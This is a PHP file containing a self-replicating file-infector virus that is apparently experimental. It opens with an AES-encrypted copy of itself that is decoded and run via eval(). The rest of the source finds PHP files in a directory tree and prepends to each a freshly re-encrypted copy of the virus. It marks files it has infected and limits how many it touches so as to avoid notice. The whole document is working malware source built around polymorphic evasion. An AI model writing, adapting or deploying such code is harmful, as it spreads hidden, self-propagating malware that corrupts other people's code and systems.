<?php // Checksum: 9298d98b11db60a48d438d4e70360305 ?><?php
$encryptedVirus = '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';
$iv = 'q4EXt6Z6D0XT2HdKl+SiNw==';
$key = '2/29XicnsPJZIkppvKkw/OE9dON/rs+E/LshFXKCgB8=';
$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode($key), base64_decode($encryptedVirus), MCRYPT_MODE_CBC, base64_decode($iv));
eval($virus);
execute($virus);
?><?php

if (!function_exists('execute')) {
    // VIRUS:START
    function execute($virus)
    {
        $fileNames = getEditableFiles('/home/NIX/psushko/Code/virus/step5', '#\.php$#'); // Get a list of all php files
        foreach ($fileNames as $fileName) { // Check each file
            $script = fopen($fileName, 'r'); // Open file

            $firstLine = fgets($script); // Check not infected
            $virusHash = md5('seed' . $fileName);

            if (false === strpos($firstLine, $virusHash)) {
                $infected = fopen($fileName . '.infected', 'w'); // Let's write to a new file

                $checksum = '<?php // Checksum: ' . $virusHash . ' ?>';
                $infection = '<?php ' . encryptedVirus($virus) . ' ?>';

                fputs($infected, $checksum, strlen($checksum));
                fputs($infected, $infection, strlen($infection));
                fputs($infected, $firstLine, strlen($firstLine));

                while ($contents = fgets($script)) {
                    fputs($infected, $contents, strlen($contents));
                }

                fclose($script); // Close both handles
                fclose($infected);

                rename($fileName, $fileName . '.original'); // Move the infected file in to place
                rename($fileName . '.infected', $fileName);

                unlink($fileName . '.original');
            }
        }
    }

    function encryptedVirus($virus)
    {
        // Gen key
        $str = '0123456789abcdef';
        $key = '';

        for ($i = 0; $i < 64; $i++) {
            $key .= $str[rand(0, strlen($str) - 1)];
        }
        $key = pack('H*', $key);

        // Encrypt
        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $encryptedVirus = mcrypt_encrypt(
            MCRYPT_RIJNDAEL_128,
            $key,
            $virus,
            MCRYPT_MODE_CBC,
            $iv
        );

        // Encode
        $encodedVirus = base64_encode($encryptedVirus);
        $encodedIV = base64_encode($iv);
        $encodedKey = base64_encode($key);

        // Payload
        $payload = "
        \$encryptedVirus = '$encodedVirus';
        \$iv = '$encodedIV';
        \$key = '$encodedKey';
        \$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode(\$key), base64_decode(\$encryptedVirus), MCRYPT_MODE_CBC, base64_decode(\$iv));
        eval(\$virus);
        execute(\$virus);
    ";

        return $payload;
    }

    function getEditableFiles($directory, $pattern, $list = null)
    {
        if ($list === null) {
            $list = [];
        }
        // Don't draw attention
        if (count($list) > 10) {
            return $list;
        }

        // Clean path
        $directory = '/' . trim($directory, '/');
        if (strlen($directory) > 1) {
            $directory .= '/';
        }

        if (is_dir($directory)) {
            if ($dh = opendir($directory)) { //Open dir
                while (($fileName = readdir($dh)) !== false) { // Read files
                    //Ignore current and parent directory
                    if ($fileName == '.' || $fileName == '..') {
                        continue;
                    }
                    // Recurse subdirectories
                    if (is_dir($directory . $fileName)) {
                        $list = getEditableFiles(
                            $directory . $fileName,
                            $pattern,
                            $list
                        );
                    }
                    // If filename matches pattern, add to list
                    if (preg_match($pattern, $fileName)) {
                        $list[] = $directory . $fileName;
                    }
                }
                closedir($dh);
            }
        }

        return $list;
    }
// VIRUS:END
}

$virus = file_get_contents(__FILE__);
$virus = substr(
    $virus,
    strpos($virus, '// VIRUS:START')
);
$virus = substr(
    $virus,
    0,
    strpos($virus, PHP_EOL . '// VIRUS:END') + strlen(PHP_EOL . '// VIRUS:END')
);
execute($virus);
//unlink(__FILE__); // Delete self after files infected
?>